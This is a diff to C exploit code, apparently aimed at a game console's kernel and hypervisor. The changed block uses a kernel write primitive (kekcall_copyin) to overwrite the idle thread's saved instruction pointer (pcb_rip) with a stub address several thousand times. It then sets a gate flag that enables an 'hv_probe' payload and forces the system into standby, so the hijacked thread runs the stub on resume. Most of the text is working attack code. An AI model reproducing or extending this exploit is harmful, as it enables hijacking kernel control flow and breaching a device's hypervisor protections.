@@ -1784,25 +1784,54 @@ static void _kldload(void* data, size_t data_size)
 
             printf("\n  sentinel: %#lx\n", readback[30]);
 
-            /* Auto-enter rest mode after arming */
+            /* Auto-enter rest mode after arming.
+             *
+             * v4: The kernel thread no longer runs a persistence loop (that
+             * caused kernel panics by monopolizing a CPU core). Instead, we
+             * hammer pcb_rip from userspace via kekcall_copyin with usleep
+             * between writes. This naturally yields the CPU.
+             *
+             * Strategy:
+             * 1. Hammer pcb_rip from userspace for 3 seconds (gate=0, safe)
+             * 2. Set gate=1 (enable hv_probe)
+             * 3. Final pcb_rip overwrite + immediate standby
+             */
             if (phase == 1) {
-                /* Set the gate at kdata+0x460 to enable hv_probe on resume.
-                 * Gate=0 during persistence loop: stub is a safe nop (no VMEXITs).
-                 * Gate=1 just before standby: stub will run hv_probe on resume. */
+                uint64_t idle_pcb = readback[6];
+                uint64_t stub_addr_val = readback[7];
+                uint64_t kdata_base_val = readback[1];
+                uint64_t pcb_rip_addr = idle_pcb + 0x38; /* PCB_RIP offset */
+                uint64_t gate_addr = kdata_base_val + 0x460;
+
+                printf("\n  >>> Hammering pcb_rip from userspace for 3 seconds... <<<\n");
+                printf("  >>> idle_pcb=%#lx stub=%#lx pcb_rip@=%#lx <<<\n",
+                       idle_pcb, stub_addr_val, pcb_rip_addr);
+                fflush(stdout);
+
+                /* Hammer pcb_rip for ~3 seconds (gate=0: stub is safe nop).
+                 * usleep(500) = 0.5ms between writes → ~6000 writes over 3s.
+                 * Each kekcall_copyin goes through syscall, naturally yields CPU. */
+                for (int arm_i = 0; arm_i < 6000; arm_i++) {
+                    kekcall_copyin(&stub_addr_val, pcb_rip_addr, 8);
+                    usleep(500);
+                }
+
+                /* Set gate=1: from this point, if idle thread executes stub,
+                 * hv_probe will run. Keep the window short. */
+                printf("  >>> Setting gate=1 + final pcb_rip overwrite + standby <<<\n");
+                fflush(stdout);
+
                 uint64_t gate_val = 1;
-                uint64_t gate_addr = readback[1] + 0x460; /* kdata_base + KDATA_GATE_OFF */
-                printf("\n  >>> Setting gate at %#lx = 1 (enabling hv_probe for resume)... <<<\n", gate_addr);
                 kekcall_copyin(&gate_val, gate_addr, 8);
 
-                printf("  >>> AUTO-STANDBY: entering rest mode in 3 seconds... <<<\n");
-                fflush(stdout);
-                sleep(3);
-                printf("  >>> Calling sceSystemStateMgrEnterStandby()... <<<\n");
-                fflush(stdout);
+                /* Final pcb_rip overwrite, immediately followed by standby */
+                kekcall_copyin(&stub_addr_val, pcb_rip_addr, 8);
+
                 int sret = sceSystemStateMgrEnterStandby();
                 printf("  >>> sceSystemStateMgrEnterStandby() returned %d <<<\n", sret);
                 if (sret != 0) {
                     printf("  >>> AUTO-STANDBY FAILED (ret=%d). Enter rest mode MANUALLY! <<<\n", sret);
+                    printf("  >>> pcb_rip will revert — overwrite was lost <<<\n");
                 }
                 fflush(stdout);
             }
